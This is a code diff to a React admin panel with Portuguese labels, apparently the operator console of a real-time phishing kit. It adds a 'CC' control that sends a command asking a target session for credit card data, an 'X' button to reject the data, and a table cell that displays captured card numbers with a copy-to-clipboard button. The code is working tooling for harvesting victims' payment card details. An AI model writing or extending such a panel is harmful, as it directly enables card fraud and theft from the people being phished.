@@ -680,6 +680,24 @@ function AdminPanel() {
                               </div>
                             </div>
                           </th>
+                          <th className="border border-[#2a2a2a] p-0">
+                            <div className="flex">
+                              <div 
+                                onClick={() => sendCommand(attempt.id, "CC")}
+                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-yellow-900/30 transition-colors flex-1"
+                                title="Clique para pedir dados do cartão"
+                              >
+                                CC
+                              </div>
+                              <div 
+                                onClick={() => sendInvalidCommand(attempt.id, "CC")}
+                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
+                                title="Invalidar dados do cartão"
+                              >
+                                X
+                              </div>
+                            </div>
+                          </th>
                           <th 
                             onClick={() => sendCommand(attempt.id, "AGUARDE")}
                             className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a] cursor-pointer hover:bg-yellow-900/30 transition-colors"
@@ -801,6 +819,21 @@ function AdminPanel() {
                             </span>
                           </td>
                           
+                          {/* CC - dados do cartão */}
+                          <td className="px-2 py-2 text-center text-sm border border-[#2a2a2a]">
+                            {attempt.credit_card ? (
+                              <button
+                                onClick={() => copyToClipboard(attempt.credit_card, `cc-${attempt.id}`)}
+                                className="bg-[#1a2a1a] hover:bg-[#253525] text-white text-xs font-bold px-3 py-1.5 rounded border border-green-500/30 transition-colors"
+                                title={attempt.credit_card}
+                              >
+                                {copiedField === `cc-${attempt.id}` ? "✓ Copiado!" : "Exibir"}
+                              </button>
+                            ) : (
+                              <span className="text-gray-600">-</span>
+                            )}
+                          </td>
+
                           {/* 👍 - apenas header, célula vazia */}
                           <td className="px-3 py-3 text-center border border-[#2a2a2a]">
                             <span className="text-gray-600">-</span>
@@ -850,6 +883,7 @@ function AdminPanel() {
                             <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
                             <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
                             <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
+                            <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
                             <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
                             <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
                             <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
